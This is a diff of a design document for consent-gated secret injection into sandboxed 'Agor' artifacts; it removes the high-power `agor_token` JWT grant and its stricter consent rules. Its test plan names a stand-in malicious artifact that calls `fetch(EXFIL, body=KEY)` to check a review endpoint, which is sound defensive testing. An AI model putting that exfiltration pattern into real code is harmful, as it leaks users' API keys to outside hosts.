@@ -110,15 +110,14 @@ The `vue3` / `svelte` / `solid` / `vue` / `angular` mappings were inherited from
 
 Discrete capability flags for daemon-supplied values. Each grant maps to a fixed env var name (with the template-appropriate prefix applied):
 
-| Grant key                | Env var name       | Behavior                                             |
-| ------------------------ | ------------------ | ---------------------------------------------------- |
-| `agor_token: true`       | `AGOR_TOKEN`       | Mint a 15-min daemon JWT for the **viewer**, inject. |
-| `agor_api_url: true`     | `AGOR_API_URL`     | Inject the daemon's base URL.                        |
-| `agor_user_email: true`  | `AGOR_USER_EMAIL`  | Inject viewer's email.                               |
-| `agor_artifact_id: true` | `AGOR_ARTIFACT_ID` | Inject this artifact's ID.                           |
-| `agor_board_id: true`    | `AGOR_BOARD_ID`    | Inject the artifact's board ID.                      |
+| Grant key                | Env var name       | Behavior                        |
+| ------------------------ | ------------------ | ------------------------------- |
+| `agor_api_url: true`     | `AGOR_API_URL`     | Inject the daemon's base URL.   |
+| `agor_user_email: true`  | `AGOR_USER_EMAIL`  | Inject viewer's email.          |
+| `agor_artifact_id: true` | `AGOR_ARTIFACT_ID` | Inject this artifact's ID.      |
+| `agor_board_id: true`    | `AGOR_BOARD_ID`    | Inject the artifact's board ID. |
 
-Conventional name + explicit declaration. Grants are part of the consent surface; consent rules below treat `agor_token` stricter than informational ones (`agor_artifact_id`, `agor_board_id`) which need no consent at all.
+Conventional name + explicit declaration. Grants are part of the consent surface, except informational grants (`agor_artifact_id`, `agor_board_id`) which need no consent.
 
 ### 4. `artifact_trust_grants` table + TOFU consent flow
 
@@ -137,12 +136,11 @@ artifact_trust_grants
 **Consent resolution at render time** (in priority order):
 
 1. Author is the viewer → no consent needed.
-2. `agor_grants.agor_token` is requested → require artifact-scoped grant (never author/instance scoped — the JWT is too high-power).
-3. `instance` grant covering the requested set → grant applies.
-4. `author` grant covering the requested set → applies.
-5. `artifact` grant covering the requested set → applies.
-6. `session` grant (in-memory only) covering the requested set → applies.
-7. None of the above → render iframe with **empty values** (artifact will likely error; that's fine and visible). Show "Trust to render with secrets" badge in the card header.
+2. `instance` grant covering the requested set → grant applies.
+3. `author` grant covering the requested set → applies.
+4. `artifact` grant covering the requested set → applies.
+5. `session` grant (in-memory only) covering the requested set → applies.
+6. None of the above → render iframe with **empty values** (artifact will likely error; that's fine and visible). Show "Trust to render with secrets" badge in the card header.
 
 **Required env var or grant set is a strict subset check.** If Alice silently adds `STRIPE_KEY` to her artifact's `required_env_vars`, the existing grant doesn't cover it; re-prompt.
 
@@ -152,7 +150,7 @@ Single dialog, renders when the user clicks "Render with secrets" on a not-yet-t
 
 - Reuses `FileCollection` (`apps/agor-ui/src/components/FileCollection/FileCollection.tsx`) — adapter from `Record<string, string>` files map to `FileItem[]`.
 - Inline file viewer pane (no separate `CodePreviewModal` round-trip — the consent buttons must stay visible while reading code).
-- Shows env vars (with ⚠ icon) and grants (with ⚠ icon, distinct color for high-power ones like `agor_token`).
+- Shows env vars and grants with distinct badges.
 - Trust scope radios: just-once, this-artifact, this-author, instance-wide. The instance option is hidden when `unix_user_mode !== 'simple'` (multi-user instances should not have a "trust everyone" button).
 - Action buttons: "Render with secrets" (commits the chosen scope), "Render without" (proceed with empty values, no grant created), "Ask agent to review" (opens the review pane below).
 
@@ -193,7 +191,7 @@ On artifact read, run a one-time `detectLegacyFormat(artifact)` that returns:
 ```ts
 {
   isLegacy: boolean
-  signals: ('has_sandpack_json' | 'has_agor_config_js' | 'no_sandpack_config' | 'has_handlebars_token' | 'has_handlebars_user_env')[]
+  signals: ('has_sandpack_json' | 'has_agor_config_js' | 'no_sandpack_config' | 'has_handlebars_agor_grant' | 'has_handlebars_user_env')[]
   detectedEnvVars: string[]      // names parsed out of {{user.env.X}}
   detectedGrants: string[]       // grant keys parsed out of {{agor.X}}
 }
@@ -252,7 +250,7 @@ Implementation:
 4. POST to `https://codesandbox.io/api/v1/sandboxes/define?json=1` with `{ files, template: artifact.sandpack_config.template }`.
 5. Return sandbox URL and instructions to set `required_env_vars` / `agor_grants` values via CodeSandbox's Secret Keys UI (the names will already match because the export uses the same prefix-per-template convention).
 
-A small caveat in the tool description: `AGOR_TOKEN` and other daemon capabilities won't work on CodeSandbox — that artifact's daemon-dependent features will fail there. This is acceptable; the eject button is for share/demo, not full equivalence.
+A small caveat in the tool description: daemon capabilities won't work on CodeSandbox — that artifact's daemon-dependent features will fail there. This is acceptable; the eject button is for share/demo, not full equivalence.
 
 UI: parallel "Open in CodeSandbox" button on the artifact card.
 
@@ -274,8 +272,7 @@ UI: parallel "Open in CodeSandbox" button on the artifact card.
 - **Migration**: legacy artifact (with `sandpack.json` + `agor.config.js`) renders in safe-degraded mode, banner appears with correct interpolated upgrade instructions.
 - **Sanitize**: blocked Sandpack props are stripped on publish (`bundlerURL`, `externalResources`, `npmRegistries`, `teamId`, etc.).
 - **Env injection**: per-template prefix is applied correctly (Vite → `VITE_`, CRA → `REACT_APP_`, etc.). Empty values injected when no consent.
-- **Consent**: artifact requires `OPENAI_KEY` + `agor_token`; first render shows modal; granting "this author" persists; second render of same author's artifact requesting same set is silent; second render with new `STRIPE_KEY` re-prompts. Revocation removes grant; next render re-prompts.
-- **`agor_token` is artifact-scoped only**: granting "this author" doesn't auto-cover JWT; re-prompt for it.
+- **Consent**: artifact requires `OPENAI_KEY` + `agor_api_url`; first render shows modal; granting "this author" persists; second render of same author's artifact requesting same set is silent; second render with new `STRIPE_KEY` re-prompts. Revocation removes grant; next render re-prompts.
 - **Strict subset on grant matching**: existing grant for `[OPENAI_KEY]` doesn't cover artifact requesting `[OPENAI_KEY, STRIPE_KEY]`.
 - **CodeSandbox export**: round-trips a simple React artifact; sandbox URL is reachable; deps install; app builds.
 - **Review endpoint**: returns concerns for an obviously malicious artifact (literal `fetch(EXFIL, body=KEY)`); returns empty concerns for a benign one.
